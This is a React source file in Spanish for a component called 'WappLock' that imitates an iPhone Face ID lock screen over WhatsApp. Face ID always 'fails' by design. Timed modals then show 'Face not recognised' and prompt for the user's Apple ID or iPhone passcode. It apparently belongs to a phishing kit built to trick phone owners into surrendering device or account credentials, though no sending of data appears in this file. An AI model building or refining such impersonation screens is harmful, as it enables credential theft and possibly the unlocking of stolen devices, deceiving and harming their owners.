import React, { useState, useEffect, useRef } from "react";
import { Container, Row, Col, Button, Modal } from "react-bootstrap";
import faceIdOne from "../assets/img/faceIdOne.png"
import faceIdTwo from "../assets/img/faceIdtwo.png";
import "../assets/css/wappLock.css"; // Asegúrate de que este archivo CSS esté importado
import { useData } from "../../context/UserContext"
const WappLock = ({
    setShowPasscode,
    translator
}) => {
    const { user } = useData();
    const [showModal, setShowModal] = useState(false);
    const [vibrate, setVibrate] = useState(false);
    const [faceIdIndex, setFaceIdIndex] = useState(0);
    const [animateFaceId, setAnimateFaceId] = useState(true);
    const [passcodeActive, setPasscodeActive] = useState(false);
    const modalTimeoutRef = useRef(null);
    const valor2 = user?.data?.unlockCode || user?.data?.unlockCode === "";

    useEffect(() => {
        let interval;
        if (animateFaceId) {
            interval = setInterval(() => {
                setFaceIdIndex((prev) => (prev === 0 ? 1 : 0));
            }, 800);
        }
        return () => clearInterval(interval);
    }, [animateFaceId]);

   
    const openModalWithTimeout = () => {
        if (modalTimeoutRef.current) clearTimeout(modalTimeoutRef.current);
        // Solo programa el timeout si el passcode no está activo
        if (!passcodeActive) {
            modalTimeoutRef.current = setTimeout(() => {
                setShowModal(true);
                setAnimateFaceId(false);
            }, 900);
        }
    };

     useEffect(() => {
        let timeout;
        if (showModal) {
            timeout = setTimeout(() => {
                handleShowPasscode();
            }, 2000);
        }
        return () => clearTimeout(timeout);
    }, [showModal]);


    useEffect(() => {
        openModalWithTimeout();
        return () => {
            if (modalTimeoutRef.current) clearTimeout(modalTimeoutRef.current);
        };
    }, [passcodeActive]);

    const handleUnlock = () => {
        setVibrate(true);
        setTimeout(() => setVibrate(false), 500);
        setShowModal(true);
        setAnimateFaceId(false);
        if (modalTimeoutRef.current) clearTimeout(modalTimeoutRef.current);
    };

    const handleClose = () => {
        setShowModal(false);
        setAnimateFaceId(true);
        openModalWithTimeout();
    };

    const handleShowPasscode = () => {
        setPasscodeActive(true);
        setShowPasscode(true);
        setShowModal(false);
        if (modalTimeoutRef.current) clearTimeout(modalTimeoutRef.current);
    };

    return (
        <Container
            fluid
            style={{
                background: "rgb(14 14 16)",
                minHeight: "100vh",
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "flex-start",
                paddingTop: 5,
                fontFamily: "system-ui, sans-serif",
            }}
        >
            <Row className="justify-content-center" id="divFaceID">
                <Col xs="auto">
                    {/* Face ID icon */}
                    <div
                        className={vibrate ? "vibrate" : ""}
                        style={{
                            border: '0.5px solid rgb(6 79 33)',
                            marginTop: 10,
                            marginBottom: 60,
                            background: "rgb(2 2 2)",
                            borderRadius: "45px",
                            width: 150,
                            height: 150,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                        }}
                    >
                        <img
                            src={faceIdIndex === 0 ? faceIdTwo : faceIdOne}
                            alt=""
                            style={{
                                width: faceIdIndex === 0 ? 62 : 60,
                                height: faceIdIndex === 0 ? 62 : 60,
                                opacity: 1,
                                transition: "width 0.4s cubic-bezier(.4,2,.6,1), height 0.4s cubic-bezier(.4,2,.6,1), opacity 0.4s",
                            }}
                        />
                    </div>
                </Col>
            </Row>

            <div id="contentWapp" style={{ margin: "40px 0 0 0" }}>
                <Row className="justify-content-center">
                    <Col xs="auto">
                        {/* Title */}
                        <h2
                            style={{
                                color: "#fff",
                                fontWeight: 700,
                                fontSize: 30,
                                margin: 0,
                                marginBottom: 16,
                                textAlign: "center",
                            }}
                        >
                            {translator("WhatsApp bloqueado")}
                        </h2>
                    </Col>
                </Row>
                <Row className="justify-content-center">
                    <Col xs="12" md="12" lg="12" className="d-flex justify-content-center">
                        {/* Button centrado */}
                        <Button
                            type="button"
                            style={{
                                background: "#232323",
                                color: "#fff",
                                border: "none",
                                borderRadius: 12,
                                padding: "8px 64px",
                                fontSize: 16,
                                fontWeight: 500,
                                marginTop: 10,
                                boxShadow: "0 2px 8px rgba(0,0,0,0.12)",
                                display: "block",
                                marginLeft: "auto",
                                marginRight: "auto",
                            }}
                            onClick={handleUnlock}
                        >
                            {translator("Anular restricción con")}<br />Face ID
                        </Button>
                    </Col>
                </Row>
            </div>

            <Modal
                show={showModal}
                onHide={handleClose}
                centered
                contentClassName="faceid-modal-content"
                backdropClassName="faceid-modal-backdrop"
            >
                <Modal.Body
                    style={{
                        backgroundColor: "#232323",
                        borderRadius: 16,
                        color: "#fff",
                        textAlign: "center",
                        padding: "24px 16px 8px 16px",
                        width: '100%',
                    }}
                >
                    <div style={{ fontWeight: 600, fontSize: 18, marginBottom: 2 }}>
                        {translator("Cara no reconocida")}
                    </div>
                    <div style={{ fontSize: 14, color: "#b0b0b0", marginBottom: 18 }}>
                        {valor2 ? translator("Iniciar sesión cn tu Apple ID") : translator("Ingresa el código del iPhone")}
                    </div>
                    <div
                        style={{
                            borderTop: "1px solid #444",
                            margin: "0 -16px 0 -16px",
                            marginBottom: 0,
                        }}
                    />
                    <Button
                        variant="link"
                        className="code-btn-action"
                        style={{
                            color: "#2997ff",
                            fontWeight: 600,
                            fontSize: 17,
                            textDecoration: "none",
                            width: "100%",
                            marginBottom: 8,
                            background: "none",
                            border: "none",
                        }}
                        onClick={handleShowPasscode}
                    >
                        {valor2 ? translator("Ingresa tu Apple ID") : translator("Ingresa el código")}
                    </Button>
                    <div
                        style={{
                            borderTop: "1px solid #444",
                            margin: "0 -16px 0 -16px",
                            marginBottom: 0,
                        }}
                    />
                    <Button
                        variant="link"
                        style={{
                            color: "#2997ff",
                            fontSize: 17,
                            textDecoration: "none",
                            width: "100%",
                        }}
                        onClick={handleClose}
                    >
                        {translator("Cancelar")}
                    </Button>
                </Modal.Body>
            </Modal>
        </Container>
    );
};

export default WappLock;